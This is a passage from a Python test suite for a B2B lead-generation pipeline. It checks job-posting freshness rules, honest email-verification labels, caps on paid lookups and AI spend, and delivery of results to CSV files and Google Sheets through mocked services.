    assert rows["Delta Co"]["posted"] == "posted 23 days ago" and rows["Epsilon Ltd"]["date_posted"] == ""
    assert res.package.period_start == TODAY - timedelta(days=30)
    assert res.package.notes[:2] == ["Jobs posted in the last 30 days (as of 2026-09-24).",
                                     "Re-posted (stale) job ads are left out."]
    assert not any("without a posting date" in n for n in res.package.notes)

    with Store(":memory:") as fresh:             # no freshness window at all
        res = run(make_client(ws, overrides={"signals": {"max_age_days": None}}), fresh)
    assert "Delta Co" in names(res)
    assert res.package.notes[0] == "Jobs of any posting date (no freshness limit), as of 2026-09-24."
    assert res.package.period_start == date(2026, 9, 1)          # the oldest job delivered


def test_job_postings_follow_the_client_rules_on_any_base_playbook(ws, store):
    # a base playbook built around another signal (templates/saas-funding.yaml: primary [funding]):
    # the client's roles / undated / re-post rules must still apply to every job posting
    _mark_beta_as_reposted(store)
    ws.playbook_text(extra="signals: {primary: [funding]}\n")
    res = run(make_client(ws), store)
    assert names(res) == ["Acme Corp", "Gamma Inc"]
    rejected = {r["company"]: r["reason"] for r in res.run.rejected}
    assert "not matching" in rejected["Eta Systems"]             # Software Engineer: not a role they fill
    assert "without a posting date" in rejected["Epsilon Ltd"]
    assert "re-posted" in rejected["Beta LLC"]


# --- email honesty ----------------------------------------------------------------------------------------

def test_a_guessed_email_is_never_verified_even_when_the_verifier_says_valid(ws, store):
    ws.playbook_text(verifier="dlv_always_valid")
    res = run(make_client(ws), store)
    assert "pat.numbers@gamma-dlv.example" in AlwaysValidVerifier.checked      # the guess was checked ...
    gamma = next(ld for ld in res.run.leads if ld.company.name == "Gamma Inc")
    assert gamma.contact.email_status == EmailStatus.VALID                    # ... and called valid
    rows = {r["Company"]: r for r in read_csv(res.files["csv"])}
    assert rows["Gamma Inc"]["Email"] == "pat.numbers@gamma-dlv.example"
    assert rows["Gamma Inc"]["Email status"] == "guessed-unverified"            # ... but never "verified"
    assert rows["Acme Corp"]["Email status"] == "verified"
    assert res.qa.email_status_counts["verified"] == 1


def test_only_verified_emails_when_the_client_excludes_unverified(ws, store):
    ws.playbook_text(verifier="dlv_always_valid")
    res = run(make_client(ws, emails={"include_unverified": False}), store)
    rows = {r["Company"]: r for r in read_csv(res.files["csv"])}
    assert (rows["Acme Corp"]["Email"], rows["Acme Corp"]["Email status"]) == ("casey@acme-dlv.example", "verified")
    for name in ("Beta LLC", "Gamma Inc"):                   # risky + guessed: withheld, person still listed
        assert (rows[name]["Email"], rows[name]["Email status"]) == ("", "not found")
        assert rows[name]["Decision-maker"]
    assert res.qa.email_status_counts == {"verified": 1, "risky": 0, "guessed-unverified": 0, "not found": 2}
    assert "Only verified emails are included; other addresses show as 'not found'." in res.package.notes


# --- the paid-lookup budget --------------------------------------------------------------------------------

MV_URL = "https://api.millionverifier.com/api/v3/"
UNCHECKED = [[*row[:6], "", row[7]] for row in CONTACTS]      # no provider status: every email needs a check


def _mv_http() -> FakeHttp:
    http = FakeHttp()
    http.add("GET", MV_URL, fn=lambda call: {
        "email": call["params"]["email"], "quality": "good", "result": "ok", "resultcode": 1, "subresult": "ok",
        "free": False, "role": False, "didyoumean": "", "credits": 9999, "executiontime": 1, "error": "",
        "livemode": True})
    return http


def _mv_workspace(ws: Workspace) -> None:
    ws.contacts(UNCHECKED)
    ws.playbook_text(verifier="millionverifier", extra="usage:\n  cost_per_call: {millionverifier: 0.004}\n")


@pytest.mark.parametrize("client_budget, flag, calls", [(0, None, 4), (2, None, 2), (2, 1, 1), (1, 0, 4)])
def test_budget_caps_paid_verifier_lookups(ws, store, client_budget, flag, calls):
    _mv_workspace(ws)
    http = _mv_http()
    res = run(make_client(ws, budget={"max_paid_lookups": client_budget}), store, http=http, budget=flag,
              env={"MILLIONVERIFIER_API_KEY": "mv-test-key"})
    mv = http.calls_to("millionverifier.com")
    assert len(mv) == calls
    assert all(c["method"] == "GET" and c["params"]["api"] == "mv-test-key" and c["params"]["timeout"] == 10
               for c in mv)
    assert {c["params"]["email"] for c in mv} <= {"casey@acme-dlv.example", "robin@beta-dlv.example",
                                                  "pat.numbers@gamma-dlv.example", "zoe@zeta-dlv.example"}
    qa = res.qa
    assert qa.paid_lookups == calls
    assert any(f"verifier millionverifier (paid): {calls} call" in u for u in qa.usage_lines)
    assert f"  estimated cost: ~${calls * 0.004:.4f}" in qa.usage_lines
    budget_warnings = [w for w in qa.warnings if w.startswith("Paid-lookup budget reached")]
    if calls < 4:
        assert budget_warnings and f"({calls} of {calls} paid lookups used)" in budget_warnings[0]
    else:
        assert not budget_warnings
    assert len(res.package.rows) == 3          # the budget limits lookups, not the delivery itself


def test_dry_run_makes_no_paid_lookups(ws, store):
    _mv_workspace(ws)
    http = _mv_http()
    res = run(make_client(ws), store, http=http, dry_run=True, env={"MILLIONVERIFIER_API_KEY": "mv-test-key"})
    assert http.calls == [] and res.qa.paid_lookups == 0
    assert len(res.package.rows) == 3


def test_budget_caps_a_paid_contact_finder(ws, store):
    ws.playbook_text(text=BASE.replace("    - {type: csv, path: contacts.csv}\n    - {type: pattern}\n",
                                       "    - {type: dlv_paid_people}\n") % {"verifier": "basic", "extra": ""})
    http = FakeHttp()
    http.add("GET", "https://people.example/v1/search", fn=lambda call: {"people": [
        {"first_name": "Alex", "last_name": "Lead", "title": "CFO", "email": f"alex@{call['params']['domain']}",
         "email_status": "valid"}]})
    res = run(make_client(ws), store, http=http, budget=1, env={"PEOPLE_API_KEY": "pk-test"})
    searches = http.calls_to("people.example")
    assert len(searches) == 1 and searches[0]["params"]["api_key"] == "pk-test"
    found = [r for r in res.package.rows if r["decision_maker"]]
    assert [r["decision_maker"] for r in found] == ["Alex Lead"]         # only one company was looked up
    assert any(w.startswith("Paid-lookup budget reached (1 of 1") for w in res.qa.warnings)
    assert any("finder dlv_paid_people (paid): 1 call" in u for u in res.qa.usage_lines)


# --- opening lines -----------------------------------------------------------------------------------------

def test_template_opening_lines(ws, store):
    res = run(make_client(ws, opening_line={"enabled": True}), store)
    rows = read_csv(res.files["csv"])
    assert list(rows[0])[-1] == "Suggested opening line"
    assert rows[0]["Suggested opening line"].startswith("Saw Acme Corp is hiring")
    assert "posted 2 days ago" in rows[0]["Suggested opening line"]
    assert res.opening is not None and res.opening.template_lines == 3 and res.opening.ai_lines == 0
    assert res.qa.opening["template_lines"] == 3
    assert not any("cost cap" in w for w in res.qa.warnings)


class PricedLLM(FakeLLM):
    model = "claude-haiku-4-5"


def test_ai_opening_lines_stop_at_the_cost_cap(ws, store, monkeypatch):
    llm = PricedLLM(*["Noticed you are hiring for this finance role and wanted to share how we find strong "
                      "candidates quickly."] * 3)
    monkeypatch.setattr("leadgen.llm.build_llm", lambda ctx: llm)
    res = run(make_client(ws, opening_line={"enabled": True, "ai": True, "max_cost_usd": 0.006}), store)
    assert len(llm.calls) == 2                          # the third call could have gone over $0.006
    assert (res.opening.ai_lines, res.opening.template_lines, res.opening.capped) == (2, 1, True)
    sources = [r["_opening_source"] for r in res.package.rows]
    assert sources == ["ai", "ai", "template"]
    assert any(w.startswith("AI opening-line cost cap reached ($0.006)") for w in res.qa.warnings)
    assert any(u.startswith("  llm ") for u in res.qa.usage_lines)        # the AI spend is in the usage lines
    assert res.qa.estimated_cost_usd == pytest.approx(res.opening.cost_usd, abs=1e-4)


def test_ai_opening_lines_are_never_called_in_a_dry_run(ws, store, monkeypatch):
    llm = PricedLLM()
    monkeypatch.setattr("leadgen.llm.build_llm", lambda ctx: llm)
    res = run(make_client(ws, opening_line={"enabled": True, "ai": True}), store, dry_run=True)
    assert llm.calls == [] and res.opening.template_lines == 3
    assert any("dry run" in n for n in res.qa.notes)


# --- Google Sheets ----------------------------------------------------------------------------------------

class _Sheet:
    def __init__(self, title: str) -> None:
        self.title, self.row_count, self.col_count, self.id = title, 1000, 26, 42
        self.values: List[List[Any]] = []

    def clear(self) -> None:
        self.values = []

    def resize(self, rows: int = 0, cols: int = 0) -> None:
        self.row_count, self.col_count = rows, cols

    def update(self, range_name: str = "A1", values: Any = None, value_input_option: str = "") -> None:
        assert value_input_option == "RAW"
        self.values = values

    def get_all_values(self) -> List[List[Any]]:
        return [list(r) for r in self.values if any(str(v).strip() for v in r)]

    def freeze(self, rows: int = 0) -> None:
        pass


class _Book:
    def __init__(self, key: str) -> None:
        self.id, self.url, self.sheets = key, f"https://docs.google.com/spreadsheets/d/{key}", {}

    def worksheet(self, title: str) -> _Sheet:
        if title not in self.sheets:
            raise _WorksheetNotFound(title)
        return self.sheets[title]

    def add_worksheet(self, title: str, rows: int, cols: int) -> _Sheet:
        self.sheets[title] = _Sheet(title)
        return self.sheets[title]


class _WorksheetNotFound(Exception):
    pass


class _SpreadsheetNotFound(Exception):
    pass


def _fake_gspread(book: _Book) -> types.ModuleType:
    mod = types.ModuleType("gspread")
    mod.exceptions = types.SimpleNamespace(WorksheetNotFound=_WorksheetNotFound,
                                           SpreadsheetNotFound=_SpreadsheetNotFound)
    mod.opened = []

    class _Client:
        def open_by_key(self, key: str) -> _Book:
            mod.opened.append(key)
            if key != book.id:
                raise _SpreadsheetNotFound(key)
            return book

    mod.service_account = lambda filename=None, **kw: _Client()
    mod.service_account_from_dict = lambda info, **kw: _Client()
    return mod


def _sheet_client(ws: Workspace, sheet_id: str) -> Client:
    key = ws.root / "sa.json"
    key.write_text('{"type": "service_account"}', encoding="utf-8")
    return make_client(ws, delivery={"folder": str(ws.deliveries / "{client}" / "{date}"), "google_sheet": {
        "spreadsheet_id": sheet_id, "worksheet": "{client} {date}", "service_account_file": str(key)}})


def test_google_sheet_push(ws, store, monkeypatch):
    book = _Book("sheet-123")
    gs = _fake_gspread(book)
    monkeypatch.setitem(sys.modules, "gspread", gs)
    res = run(_sheet_client(ws, "sheet-123"), store)
    assert res.sheet_url == "https://docs.google.com/spreadsheets/d/sheet-123#gid=42"
    sheet = book.sheets["acme 2026-09-24"]
    assert sheet.values[0] == [h for _, h in columns()] and len(sheet.values) == 4
    assert res.qa.sheet_url == res.sheet_url and "google sheet: https://" in res.qa.text()


def test_google_sheet_is_not_pushed_in_a_dry_run(ws, store, monkeypatch):
    gs = _fake_gspread(_Book("sheet-123"))
    monkeypatch.setitem(sys.modules, "gspread", gs)
    res = run(_sheet_client(ws, "sheet-123"), store, dry_run=True)
    assert gs.opened == [] and res.sheet_url == ""
    assert "Google Sheet not updated (dry run)" in res.qa.notes


def test_an_empty_same_day_redelivery_never_touches_the_sheet(ws, store, monkeypatch):
    book = _Book("sheet-123")
    monkeypatch.setitem(sys.modules, "gspread", _fake_gspread(book))
    client = _sheet_client(ws, "sheet-123")
    first = run(client, store)
    assert len(book.sheets["acme 2026-09-24"].values) == 4

    # the same day again (a config fix, or by accident): the ledger dedupes everything -> 0 rows.
    # An empty delivery is not sent - also not to the sheet the client reads
    second = run(client, store)
    assert second.folder == first.folder.with_name("2026-09-24-2") and second.package.rows == []
    assert [r[0] for r in book.sheets["acme 2026-09-24"].values[1:]] == names(first)
    assert list(book.sheets) == ["acme 2026-09-24"]
    assert second.sheet_url == "" and "Google Sheet not updated (no leads in this delivery)" in second.qa.notes


def test_a_same_day_redelivery_with_new_leads_never_replaces_the_earlier_tab(ws, store, monkeypatch):
    book = _Book("sheet-123")
    monkeypatch.setitem(sys.modules, "gspread", _fake_gspread(book))
    client = _sheet_client(ws, "sheet-123")
    first = run(client, store)
    ws.jobs(JOBS + [["Hotco", "hotco-dlv.example", "Austin, TX", "Software", 150, "job_posting",
                     "Senior Accountant", "2026-09-24", "https://hotco-dlv.example/jobs/1", "hc-1"]])
    second = run(client, store)
    # like the files (-> <folder>-2), the rows never replace the earlier delivery's tab
    assert second.folder == first.folder.with_name("2026-09-24-2") and names(second) == ["Hotco"]
    assert [r[0] for r in book.sheets["acme 2026-09-24"].values[1:]] == names(first)
    new_tabs = [t for t in book.sheets if t != "acme 2026-09-24"]
    assert len(new_tabs) == 1 and [r[0] for r in book.sheets[new_tabs[0]].get_all_values()[1:]] == ["Hotco"]
    assert second.sheet_url


def test_a_failed_google_sheet_push_is_a_warning_and_the_delivery_still_counts(ws, store, monkeypatch):
    monkeypatch.setitem(sys.modules, "gspread", _fake_gspread(_Book("sheet-123")))
    res = run(_sheet_client(ws, "wrong-id"), store)
    assert res.sheet_url == ""
    assert any(w.startswith("Google Sheet not updated") and "not found" in w for w in res.qa.warnings)
    assert all(p.is_file() for p in res.files.values()) and res.recorded > 0


# --- source problems ----------------------------------------------------------------------------------------

def test_a_broken_source_is_a_qa_warning_and_the_rest_is_delivered(ws, store):
    ws.playbook_text(text=BASE.replace("    path: jobs.csv\n", "    path: jobs.csv\n  - type: csv\n"
                                       "    label: partner-feed\n    path: missing-feed.csv\n")
                     % {"verifier": "basic", "extra": ""})
    res = run(make_client(ws), store)
    assert names(res) == ["Acme Corp", "Gamma Inc", "Beta LLC"]
    problems = [w for w in res.qa.warnings if w.startswith("Source problem")]
    assert len(problems) == 1 and "partner-feed" in problems[0] and "missing this week" in problems[0]


# --- settings problems + entry points ------------------------------------------------------------------------

def test_bad_formats_are_reported_before_anything_runs(ws, store):
    for formats, message in ((["pdf"], "unknown delivery format"), ([], "delivery.formats is empty")):
        client = make_client(ws, delivery={"formats": formats, "folder": str(ws.deliveries / "{client}")})
        with pytest.raises(ClientError, match=message):
            run(client, store)
    assert store.list_runs() == [] and not ws.deliveries.exists()


@pytest.mark.parametrize("budget", [-1, True, "5", 2.5])
def test_a_bad_budget_is_a_clear_error(ws, store, budget):
    with pytest.raises(ValueError, match="budget must be a whole number >= 0"):
        run(make_client(ws), store, budget=budget)


def test_a_missing_base_playbook_is_a_client_error(ws, store):
    with pytest.raises(ClientError, match="base playbook"):
        run(make_client(ws, playbook=str(ws.base / "nope.yaml")), store)


def test_client_by_name_and_relative_folder(ws, store, monkeypatch):
    monkeypatch.chdir(ws.root)
    (ws.root / "clients").mkdir()
    (ws.root / "clients" / "acme.yaml").write_text(
        f"display_name: Acme Staffing Ltd\nplaybook: {ws.playbook}\nroles: [accountant, controller]\n"
        f"company_size: {{min: 20}}\nleads_per_week: 5\ndelivery:\n  folder: out/{{client}}/{{date}}\n"
        f"  formats: [csv]\n", encoding="utf-8")
    res = run("acme", store)
    assert isinstance(res.client, Client) and res.client.display_name == "Acme Staffing Ltd"
    assert res.folder == Path("out/acme/2026-09-24") and (ws.root / res.files["csv"]).is_file()
    assert len(res.package.rows) == 3


def test_without_a_store_the_playbook_database_is_used(ws):
    db = ws.root / "db" / "leadgen.db"
    ws.playbook_text(extra=f"storage: {{path: '{db}'}}\n")
    res = deliver(make_client(ws), store=None, env={}, http=FakeHttp(), today=TODAY)
    assert len(res.package.rows) == 3 and db.is_file()
    with Store(db) as reopened:
        assert Ledger(reopened).summary("acme")["company"] == 3


def test_package_notes_follow_the_client_settings():
    c = Client("acme", freshness_days=14, allow_undated=True, drop_reposts=False, dedupe=["company"],
               redelivery_days=28, emails={"include_unverified": False})
    assert package_notes(c, TODAY, dry_run=True) == [
        "Jobs posted in the last 14 days (as of 2026-09-24).",
        "Companies already sent to you in the last 28 days are left out.",
        "Only verified emails are included; other addresses show as 'not found'.",
        "PREVIEW - not recorded as delivered."]
    assert package_notes(Client("acme", dedupe=[]), TODAY)[-1] == "Re-posted (stale) job ads are left out."
